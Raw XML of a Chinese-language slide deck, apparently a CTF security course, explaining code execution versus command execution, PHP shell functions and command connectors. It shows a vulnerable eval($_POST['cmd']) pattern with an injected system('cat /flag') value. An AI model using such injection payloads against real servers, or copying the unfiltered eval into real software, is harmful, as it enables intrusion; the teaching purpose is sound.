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7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6" r:id="rId3"/>
    <p:sldId id="926" r:id="rId5"/>
    <p:sldId id="915" r:id="rId6"/>
    <p:sldId id="930" r:id="rId7"/>
    <p:sldId id="929" r:id="rId8"/>
    <p:sldId id="931" r:id="rId9"/>
    <p:sldId id="934" r:id="rId10"/>
    <p:sldId id="927" r:id="rId11"/>
    <p:sldId id="925" r:id="rId12"/>
    <p:sldId id="917" r:id="rId13"/>
    <p:sldId id="916" r:id="rId14"/>
    <p:sldId id="918" r:id="rId15"/>
    <p:sldId id="919" r:id="rId16"/>
    <p:sldId id="932" r:id="rId17"/>
    <p:sldId id="933" r:id="rId18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E82F69B-3CD6-45F5-835E-96710F2B870A}">
          <p14:sldIdLst>
            <p14:sldId id="256"/>
            <p14:sldId id="926"/>
            <p14:sldId id="915"/>
            <p14:sldId id="930"/>
            <p14:sldId id="929"/>
            <p14:sldId id="931"/>
            <p14:sldId id="934"/>
            <p14:sldId id="927"/>
            <p14:sldId id="925"/>
            <p14:sldId id="917"/>
            <p14:sldId id="916"/>
            <p14:sldId id="918"/>
            <p14:sldId id="919"/>
            <p14:sldId id="932"/>
            <p14:sldId id="9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7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803" userDrawn="1">
          <p15:clr>
            <a:srgbClr val="A4A3A4"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="4" pos="870" userDrawn="1">
          <p15:clr>
            <a:srgbClr val="A4A3A4"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="5" orient="horz" pos="796" userDrawn="1">
          <p15:clr>
            <a:srgbClr val="A4A3A4"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="6" orient="horz" pos="51" userDrawn="1">
          <p15:clr>
            <a:srgbClr val="A4A3A4"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="7" orient="horz" pos="4050" userDrawn="1">
          <p15:clr>
            <a:srgbClr val="A4A3A4"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="8" orient="horz" pos="304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华" initials="李" lastIdx="1" clrIdx="0"/>
  <p:cmAuthor id="2" name="许 娜" initials="许" lastIdx="4" clrIdx="1"/>
  <p:cmAuthor id="3" name="戚圣嘉" initials="戚圣嘉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0C00F4"/>
    <a:srgbClr val="1F4E79"/>
    <a:srgbClr val="BAC9D6"/>
    <a:srgbClr val="AEAEAE"/>
    <a:srgbClr val="EDEDED"/>
    <a:srgbClr val="B7C5EF"/>
    <a:srgbClr val="80C04D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09" autoAdjust="0"/>
    <p:restoredTop sz="95383" autoAdjust="0"/>
  </p:normalViewPr>
  <p:slideViewPr>
    <p:cSldViewPr snapToGrid="0" showGuides="1">
      <p:cViewPr varScale="1">
        <p:scale>
          <a:sx n="84" d="100"/>
          <a:sy n="84" d="100"/>
        </p:scale>
        <p:origin x="571" y="86"/>
      </p:cViewPr>
      <p:guideLst>
        <p:guide orient="horz" pos="2072"/>
        <p:guide pos="3840"/>
        <p:guide pos="6803"/>
        <p:guide pos="870"/>
        <p:guide orient="horz" pos="796"/>
        <p:guide orient="horz" pos="51"/>
        <p:guide orient="horz" pos="4050"/>
        <p:guide orient="horz" pos="3045"/>
      </p:guideLst>
    </p:cSldViewPr>
  </p:slideViewPr>
  <p:outlineViewPr>
    <p:cViewPr>
      <p:scale>
        <a:sx n="33" d="100"/>
        <a:sy n="33" d="100"/>
      </p:scale>
      <p:origin x="0" y="-33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10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624CE-7C2E-4E83-947B-0B9B4867D61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3CE8C-7721-4627-9962-8DC500CBB7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8F2AF-B165-49ED-8D49-F91D3C9FFC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latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>补充：</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1200" dirty="0">
              <a:latin typeface="+mn-ea"/>
              <a:ea typeface="+mn-ea"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1200" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>无</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1200" dirty="0"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5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1"/>
            <a:ext cx="12192000" cy="6858000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic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673100" y="3870251"/>
            <a:ext cx="10845800" cy="468637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>
                <a:solidFill>
                  <a:srgbClr val="38447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673099" y="2920209"/>
            <a:ext cx="10845800" cy="894050"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="ctr" anchorCtr="1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4394880"/>
            <a:ext cx="10845800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4766355"/>
            <a:ext cx="10845800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日期</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN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81000" cy="3429000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="C42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381000" cy="381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8763001" y="6477000"/>
            <a:ext cx="3429000" cy="381000"/>
            <a:chOff x="8763001" y="6477000"/>
            <a:chExt cx="3429000" cy="381000"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="10" name="Rectangle 9"/>
            <p:cNvSpPr/>
            <p:nvPr userDrawn="1"/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm rot="5400000">
              <a:off x="10287001" y="4953000"/>
              <a:ext cx="381000" cy="3429000"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:srgbClr val="C425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4" name="Rectangle 13"/>
            <p:cNvSpPr/>
            <p:nvPr userDrawn="1"/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm rot="5400000">
              <a:off x="11811001" y="6477000"/>
              <a:ext cx="381000" cy="3810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1028" name="Picture 4" descr="http://zsjy.gzhu.edu.cn/images/pic_logo.pn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5034" b="-7143"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="391886" y="-1"/>
            <a:ext cx="3463289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086" y="-39914"/>
            <a:ext cx="1113116" cy="111311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063" y="-19958"/>
            <a:ext cx="1484186" cy="10686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8" name="Rectangle 7"/>
          <p:cNvSpPr/>
          <p:nvPr userDrawn="1"/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="11582400" y="0"/>
            <a:ext cx="612648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0" name="Picture Placeholder 2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352800" cy="6858000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="en-MY"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="标题 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ctrTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3944679" y="0"/>
            <a:ext cx="7575809" cy="1028700"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" anchor="b" anchorCtr="0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266"/>
            <a:ext cx="12192000" cy="687926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266"/>
            <a:ext cx="11649807" cy="687926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09756" cy="68580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206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582401" cy="68580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  <a:noFill/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grp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grp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206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0" y="6248400"/>
            <a:ext cx="12192000" cy="609600"/>
            <a:chOff x="0" y="6248400"/>
            <a:chExt cx="12192000" cy="609600"/>
          </a:xfrm>
          <a:solidFill>
            <a:srgbClr val="002060"/>
          </a:solidFill>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="10" name="Rectangle 9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0" y="6248400"/>
              <a:ext cx="1524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0"/>
            <a:ext cx="10850563" cy="102870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rgbClr val="3944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326898" y="5979924"/>
            <a:ext cx="2909888" cy="206381"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr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925" y="1028700"/>
            <a:ext cx="10850563" cy="45719"/>
            <a:chOff x="0" y="990600"/>
            <a:chExt cx="12192001" cy="45719"/>
          </a:xfrm>
          <a:solidFill>
            <a:srgbClr val="C4251F"/>
          </a:solidFill>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="15" name="Rectangle 14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482" y="6206331"/>
            <a:ext cx="963524" cy="6937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26" y="6235700"/>
            <a:ext cx="622300" cy="622300"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic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669924" y="1123950"/>
            <a:ext cx="10850563" cy="50196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0" y="6248400"/>
            <a:ext cx="12192000" cy="609600"/>
            <a:chOff x="0" y="6248400"/>
            <a:chExt cx="12192000" cy="609600"/>
          </a:xfrm>
          <a:solidFill>
            <a:srgbClr val="002060"/>
          </a:solidFill>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="10" name="Rectangle 9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0" y="6248400"/>
              <a:ext cx="152400" cy="609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0"/>
            <a:ext cx="10850563" cy="102870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rgbClr val="3944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925" y="1028700"/>
            <a:ext cx="10850563" cy="45719"/>
            <a:chOff x="0" y="990600"/>
            <a:chExt cx="12192001" cy="45719"/>
          </a:xfrm>
          <a:solidFill>
            <a:srgbClr val="C4251F"/>
          </a:solidFill>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="15" name="Rectangle 14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482" y="6206331"/>
            <a:ext cx="963524" cy="6937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26" y="6235700"/>
            <a:ext cx="622300" cy="622300"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1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344482" y="6006300"/>
            <a:ext cx="2909888" cy="206381"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr sz="1800" b="1"/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391" y="6235700"/>
            <a:ext cx="2132315" cy="65801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0" cy="6858001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669924" y="3456451"/>
            <a:ext cx="10850563" cy="869854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结束语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69924" y="4406734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accent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署名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69924" y="4722368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时间日期</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="6" name="Group 5"/>
          <p:cNvGrpSpPr/>
          <p:nvPr userDrawn="1"/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm rot="5400000">
            <a:off x="10442716" y="202243"/>
            <a:ext cx="69568" cy="3429000"/>
            <a:chOff x="0" y="0"/>
            <a:chExt cx="381000" cy="3429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381000" cy="34290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 rot="16200000">
            <a:off x="1679716" y="202243"/>
            <a:ext cx="69568" cy="3429000"/>
            <a:chOff x="0" y="0"/>
            <a:chExt cx="381000" cy="342900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0" y="0"/>
              <a:ext cx="381000" cy="3429000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465" y="1123950"/>
            <a:ext cx="1553273" cy="155327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591" y="1140104"/>
            <a:ext cx="2157323" cy="155327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996" y="1077943"/>
            <a:ext cx="1677597" cy="167759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F69DF-D574-4037-B6A5-58CCD724C6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35700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35700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35700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image" Target="../media/image25.png"/><Relationship Id="rId6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag5.xml"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image24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8.xml"/><Relationship Id="rId12" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image27.png"/><Relationship Id="rId11" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag8.xml"/><Relationship Id="rId10" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image26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37.webp"/><Relationship Id="rId1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13835" y="2758440"/>
            <a:ext cx="47136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代码</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN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命令执行</a:t>
            </a:r>
            <a:b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zh-CN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(RCE)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="5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代码执行</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t> vs </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>命令执行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540" y="2251710"/>
            <a:ext cx="2488565" cy="15538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865" y="2079625"/>
            <a:ext cx="1452880" cy="17259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672590" y="1356995"/>
            <a:ext cx="1435100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代码</a:t>
            </a:r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执行</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US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10295" y="1356995"/>
            <a:ext cx="1441450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命令</a:t>
            </a:r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执行</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US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9925" y="4067810"/>
            <a:ext cx="3789045" cy="1537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dirty="0"/>
              <a:t>代码执行漏洞是由于服务器对</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>危险函数过滤不严</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>导致用户输入的一些字符串可以被转换成代码的函数</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>如</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>PHP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>中的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>eval </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>来执行</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>,</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>从而造成代码执行漏洞。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7393305" y="4067810"/>
            <a:ext cx="406400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/>
              <a:t>命令执行漏洞是</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>应用的脚本代码在执行</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>命令</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>的时候过滤不严。从而注入一段攻击者能够控制的代码</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>,</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>在服务器上以</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>服务的后台权限远程执行恶意指令，这里的命令是</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>系统命令</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>(Linux Bash</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>、</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Windows CMD)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>，如</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>ls</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>，</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>whoami......</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="文本框 13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5414645" y="1852930"/>
            <a:ext cx="1978660" cy="1861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1500" b="1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zh-CN" altLang="en-US" sz="11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56945" y="5638165"/>
            <a:ext cx="3215005" cy="36830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p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>echo system() </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>和</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> eval </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>system()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代码执行与命令执行的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US">
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>关系</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US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475105" y="1612265"/>
            <a:ext cx="9241790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/>
              <a:t>在</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> CTF </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>比赛中，这两者往往是紧密相连的，</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>代码执行通常可以转化为命令执行：</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>       </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>如果你拥有了代码执行权限，最常规的操作就是利用语言自身的系统调用函数来执行系统命令。</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0"/>
              <a:t>     · </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>例如：存在</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> eval($_POST['cmd']); </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>漏洞，你传入</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> cmd=system('cat /flag');</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>，这就是通过代码执行打通了命令执行。可简单理解为代码执行里面嵌套了一个命令执行。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475105" y="3290570"/>
            <a:ext cx="3302635" cy="119888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p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>system</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>是系统调用函数，而</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>eval</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>不是，</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>eval() </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>函数的本质是解析并执行</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> “</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>编程语言表达式</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>”</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>，而非</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> “</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>操作系统命令</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>”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475105" y="4878070"/>
            <a:ext cx="3302635" cy="92202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p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>以</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> Python </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>为例，</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>eval(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>字符串</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>会把字符串当作</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> Python </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>表达式来执行，</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>比如</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>eval("1+2*3")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9255" y="3227070"/>
            <a:ext cx="2743200" cy="762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255" y="4097020"/>
            <a:ext cx="5598160" cy="1996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10" grpId="1" animBg="1"/>
      <p:bldP spid="11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常用</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>命令执行函数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828165" y="1263650"/>
            <a:ext cx="1320165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system</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN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231630" y="1263650"/>
            <a:ext cx="934085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exec</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN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9925" y="210312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/>
              <a:t>该函数会把执行结果输出</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>并把输出结果的最后一行作为字符串返回</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>如果执行失败则返回</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>false </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>这个也最为常用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695" y="3127375"/>
            <a:ext cx="2919095" cy="10426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4272915"/>
            <a:ext cx="4568190" cy="195961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556500" y="21031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/>
              <a:t>不输出结果</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>,</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>返回执行结果的最后一行</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>可以使用</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>output</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>进行输出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590" y="3029585"/>
            <a:ext cx="2675255" cy="11658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950" y="4272280"/>
            <a:ext cx="4147185" cy="1939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常用</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>命令执行函数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1640840" y="1263650"/>
            <a:ext cx="1485900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passthru</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN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719185" y="1263650"/>
            <a:ext cx="1748155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shell_exec</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN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69925" y="20821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/>
              <a:t>此函数只调用命令</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>并把运行结果原样地直接输出</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>没有返回值。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22680" y="2981325"/>
            <a:ext cx="2522220" cy="9251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48005" y="4069080"/>
            <a:ext cx="4308475" cy="214376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7707630" y="20821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/>
              <a:t>不输出结果，返回执行结果</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>使用反引号</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>(``)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>时调用的就是此函数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414260" y="4069715"/>
            <a:ext cx="4357370" cy="21431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147050" y="3017520"/>
            <a:ext cx="2891790" cy="889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命令连接符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69925" y="1263650"/>
            <a:ext cx="5640070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Windows</a:t>
            </a:r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和</a:t>
            </a:r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Linux</a:t>
            </a:r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都支持的命令连接符：</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US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9925" y="2023110"/>
            <a:ext cx="10042525" cy="2811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2400" b="1" dirty="0"/>
              <a:t>·  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" b="1" dirty="0"/>
              <a:t>cmd1 | cmd2   cmd1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>的输出作为</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" b="1" dirty="0"/>
              <a:t>cmd2</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>的输入，最后只显示</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" b="1" dirty="0"/>
              <a:t>cmd2</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>结果</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
